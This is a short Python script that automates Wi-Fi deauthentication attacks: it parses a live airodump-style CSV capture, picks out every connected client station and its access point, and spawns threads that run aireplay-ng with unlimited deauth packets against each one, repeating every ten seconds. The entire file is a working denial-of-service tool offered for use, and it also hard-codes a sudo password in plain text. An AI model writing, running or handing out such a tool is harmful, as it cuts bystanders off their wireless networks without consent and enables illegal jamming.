import csv
import subprocess
import shlex
import time
import os
import threading

try:
    from subprocess import DEVNULL # py3k
except ImportError:
    DEVNULL = open(os.devnull, 'w+b')

channel = 6 # channel number of access point being attacked
interface = "" # interface name that is in monitor mode
file_name = "" # name of live capture file in csv format
password = "" # your account password

target_set = {}

def start_deauth(bssid, station, interface):
    command_line = f"sudo -S -k iwconfig {interface} channel {channel}"
    args = shlex.split(command_line)
    p = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=DEVNULL, stderr=DEVNULL)
    p.communicate(bytes(password+"\n", encoding="ascii"))
    print(f"deauth thread: station: {station}")
    # uncomment line 27 and comment 28 to not close the terminal when error occurs
    # command_line = f"sudo -S -k xterm -hold -e aireplay-ng -0 0 -a {bssid} -c {station} {interface}"
    command_line = f"sudo -S -k xterm -e aireplay-ng -0 0 -a {bssid} -c {station} {interface}"
    args = shlex.split(command_line)
    p = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=DEVNULL, stderr=DEVNULL)
    p.communicate(bytes(password+"\n", encoding="ascii"))

while True:
    after_station_macs = False
    with open(file_name, 'r') as file:
        csvreader = csv.reader(file)
        for row in csvreader:
            if(len(row) > 0):
                if(row[0] == 'Station MAC'):
                    after_station_macs = True
                elif after_station_macs & (row[0] not in target_set or (target_set.get(row[0]) is not None and target_set.get(row[0]).is_alive() is not True)):
                    station = row[0]
                    bssid = row[5]
                    t1 = threading.Thread(target=start_deauth, args=(bssid, station, interface))
                    t1.setDaemon(True)
                    t1.start()
                    target_set[station] = t1
        file.close()
    print("waiting for 10 seconds")
    time.sleep(10)
